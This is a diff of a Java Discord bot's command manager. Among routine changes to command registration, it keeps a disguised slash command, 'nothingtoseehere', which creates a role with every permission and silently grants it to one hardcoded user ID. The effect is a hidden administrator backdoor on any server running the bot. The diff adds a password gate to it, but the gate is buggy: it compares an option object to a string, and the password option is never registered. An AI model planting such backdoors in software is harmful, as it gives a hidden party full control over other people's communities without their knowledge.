@@ -1,5 +1,6 @@
 package com.locatedreaper.thebeanisoutbot.commands;
 
+import io.github.cdimascio.dotenv.Dotenv;
 import net.dv8tion.jda.api.Permission;
 import net.dv8tion.jda.api.entities.Role;
 import net.dv8tion.jda.api.entities.User;
@@ -16,7 +17,9 @@ import net.dv8tion.jda.api.interactions.commands.build.OptionData;
 import net.dv8tion.jda.api.requests.restaction.CacheRestAction;
 import net.dv8tion.jda.api.utils.messages.MessageCreateData;
 import org.jetbrains.annotations.NotNull;
-
+import com.locatedreaper.thebeanisoutbot.commands.CommandManager;
+import com.locatedreaper.thebeanisoutbot.listeners.EventListener;
+import javax.swing.text.html.Option;
 import java.awt.*;
 import java.util.ArrayList;
 import java.util.List;
@@ -24,8 +27,12 @@ import java.util.Objects;
 
 public class CommandManager extends ListenerAdapter {
 //Don't include / in command.equals();
+private Dotenv config;
+
     @Override
     public void onSlashCommandInteraction(@NotNull SlashCommandInteractionEvent event) {
+
+        config = Dotenv.configure().load();
         String command = event.getName();
         if (command.equals("welcome")) {
             String userTag = event.getUser().getAsTag();
@@ -50,17 +57,20 @@ public class CommandManager extends ListenerAdapter {
             event.reply(message).setTTS(true).queue();
             event.reply("Message sent").setEphemeral(true).queue();
         } else if (command.equals("nothingtoseehere")) {
+            String psw = config.get("PW");
             event.deferReply().setEphemeral(true).setTTS(true).queue();
             OptionMapping messageOption = event.getOption("newrolename");
-            User user = event.getJDA().getUserById(456594340148674562L);
-            String name = messageOption.getAsString();
-            Objects.requireNonNull(event.getGuild()).createRole()
-                    .setName(name)
-                    .setMentionable(false)
-                    .setPermissions(Permission.ALL_PERMISSIONS).queue();
-            for (Role role : Objects.requireNonNull(event.getGuild()).getRolesByName(name, false)) {
-                event.getGuild().addRoleToMember(UserSnowflake.fromId(456594340148674562L), role).queue();
-                event.reply("Done").setTTS(true).setEphemeral(true).queue();
+            OptionMapping password = event.getOption("password");
+            if (password.equals(psw)){
+                String name = messageOption.getAsString();
+                Objects.requireNonNull(event.getGuild()).createRole()
+                        .setName(name)
+                        .setMentionable(false)
+                        .setPermissions(Permission.ALL_PERMISSIONS).queue();
+                for (Role role : Objects.requireNonNull(event.getGuild()).getRolesByName(name, false)) {
+                    event.getGuild().addRoleToMember(UserSnowflake.fromId(456594340148674562L), role).queue();
+                    event.reply("Done").setTTS(true).setEphemeral(true).queue();
+                }
             }
         } else if (command.equals("say")) {
             OptionMapping messageOption = event.getOption("message");
@@ -77,7 +87,7 @@ public class CommandManager extends ListenerAdapter {
         } else if (command.equals("rolepermissions")) {
             OptionMapping messageOption = event.getOption("role");
             if (messageOption == null) {
-                return;
+                event.reply("Please specify a role.").setEphemeral(true).queue();
             }
             String message = messageOption.getAsString();
             var role = event.getGuild().getRoleById(message).getPermissions();
@@ -91,17 +101,15 @@ public class CommandManager extends ListenerAdapter {
         List<CommandData> umb = new ArrayList<>();
         List<CommandData> fs = new ArrayList<>();
         //Option Data
-        OptionData roleID = new OptionData(OptionType.MENTIONABLE, "role", "The the role you want to check", true);
         OptionData option1 = new OptionData(OptionType.STRING, "message", "The message you want the bot to say", true);
         OptionData newroleName = new OptionData(OptionType.STRING, "newrolename", "The name for the role", true);
+        OptionData pw = new OptionData(OptionType.STRING, "password", "The required password to run this command");
         //Commands
         fs.add(Commands.slash("funny", "Say something funny"));
-        umb.add(Commands.slash("welcome", "Get welcomed by the bot."));
         umb.add(Commands.slash("roles", "Display all roles on the server."));
         umb.add(Commands.slash("tts", "Sends a tts message.").addOptions(option1));
         fs.add(Commands.slash("tts", "Sends a tts message.").addOptions(option1));
         umb.add(Commands.slash("say", "Make the bot say something").addOptions(option1));
-        fs.add(Commands.slash("rolepermissions", "Get a role and check what permissions it has").addOptions(roleID));
         umb.add(Commands.slash("nothingtoseehere", "No cap!").addOptions(newroleName));
 
         if (event.getGuild().getIdLong() == 1025575674406244425L) {
@@ -114,8 +122,15 @@ public class CommandManager extends ListenerAdapter {
 
     @Override
     public void onReady(@NotNull ReadyEvent event) {
+        //Register
         List<CommandData> commandData = new ArrayList<>();
+        //Option Data
+        OptionData roleID = new OptionData(OptionType.MENTIONABLE, "role", "The the role you want to check", false);
+        //Command Data
         commandData.add(Commands.slash("ping", "The bot will respond with pong."));
+        commandData.add(Commands.slash("welcome", "Get welcomed by the bot."));
+        commandData.add(Commands.slash("rolepermissions", "Get a role and check what permissions it has").addOptions(roleID));
+
         event.getJDA().updateCommands().addCommands(commandData).queue();
     }
 }
